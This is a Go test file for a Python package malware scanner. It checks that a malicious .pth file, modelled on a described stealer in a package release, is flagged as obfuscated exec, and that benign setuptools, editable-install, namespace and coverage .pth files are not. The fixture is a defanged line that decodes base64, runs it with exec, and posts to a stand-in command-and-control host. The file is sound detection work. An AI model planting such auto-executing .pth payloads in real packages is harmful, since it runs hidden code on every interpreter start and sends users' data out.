package pysource

// Attack 2026-26 (package half): elementary-data 0.23.3 shipped its stealer
// as a top-level elementary.pth — one ~245 KB line of base64 (two XOR
// layers inside). site.py executes any .pth line that starts with `import`
// at every interpreter start, so the payload ran without `import elementary`.
//
// Since v0.22.106 (F7) Scan reads the lines of a .pth that site.py executes
// (those starting with `import`) as module top-level code; before, it read
// only *.py files and this payload was invisible.

import "testing"

// atk26Pth is a defanged elementary.pth line: decode a blob, exec it, and
// post the result (the curl --data-binary exfil, here urllib to an invalid
// host so the dropper co-marker is present).
const atk26Pth = `import base64,urllib.request;exec(base64.b64decode("cHJpbnQoMSk="));urllib.request.urlopen("https://c2.example.invalid/u",data=b"x")` + "\n"

func TestAttack2026_26_ElementaryPthScanned(t *testing.T) {
	r := Scan(map[string][]byte{"elementary.pth": []byte(atk26Pth)})
	if !r.Detected || r.Kind != "obfuscated_exec" || r.Detail != "elementary.pth" {
		t.Fatalf("elementary.pth decode-and-exec must fire obfuscated_exec, got %+v", r)
	}
	// A path-entry line is never executed by site.py, so the same text there
	// is not code.
	if r := Scan(map[string][]byte{"elementary.pth": []byte("/opt/x/" + atk26Pth)}); r.Detected {
		t.Fatalf("a .pth path entry is not executed, got %+v", r)
	}
	// Negative controls: the .pth files setuptools, editable installs,
	// namespace packages and coverage write execute code too, and are clean.
	for name, body := range map[string]string{
		"distutils-precedence.pth":        "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n",
		"__editable__.foo-1.0.pth":        "import __editable___foo_1_0_finder; __editable___foo_1_0_finder.install()\n",
		"google_auth-2.0-py3.9-nspkg.pth": "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));importlib = has_mfs and __import__('importlib.util');has_mfs and __import__('importlib.machinery');m = has_mfs and sys.modules.setdefault('google', importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec('google', [os.path.dirname(p)])))\n",
		"coverage.pth":                    "import coverage; coverage.process_startup()\n",
		"easy-install.pth":                "./foo-1.0-py3.9.egg\n/opt/src/bar\n",
	} {
		if r := Scan(map[string][]byte{name: []byte(body)}); r.Detected {
			t.Fatalf("benign %s flagged: %+v", name, r)
		}
	}
}
